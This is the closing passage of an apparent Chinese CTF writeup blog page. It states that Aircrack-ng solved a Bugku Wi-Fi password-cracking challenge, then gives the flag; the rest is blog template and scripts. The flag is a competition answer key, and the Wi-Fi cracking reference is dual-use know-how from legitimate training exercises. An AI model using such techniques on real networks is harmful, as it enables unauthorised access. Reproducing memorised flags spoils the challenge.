+<p>使用工具Aircrack-ng</p>
+<p><img src="https://image.mengsec.com/Bugku-Misc-%E6%83%B3%E8%B9%AD%E7%BD%91%E5%85%88%E8%A7%A3%E5%BC%80%E5%AF%86%E7%A0%81-1.png" srcset="/img/loading.gif"><br><img src="https://image.mengsec.com/Bugku-Misc-%E6%83%B3%E8%B9%AD%E7%BD%91%E5%85%88%E8%A7%A3%E5%BC%80%E5%AF%86%E7%A0%81-2.png" srcset="/img/loading.gif"></p>
+<p>flag为</p>
+<pre><code>flag&#123;13910407686&#125;
+</code></pre>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1>
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Writeup/">Writeup</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2017/10/10/%E5%AE%9E%E9%AA%8C%E5%90%A7%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEWriteup/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">实验吧部分题目Writeup</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2017/10/04/XDCTF-%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEWriteUp/">
+                        <span class="hidden-mobile">XDCTF 初赛部分题目WriteUp</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
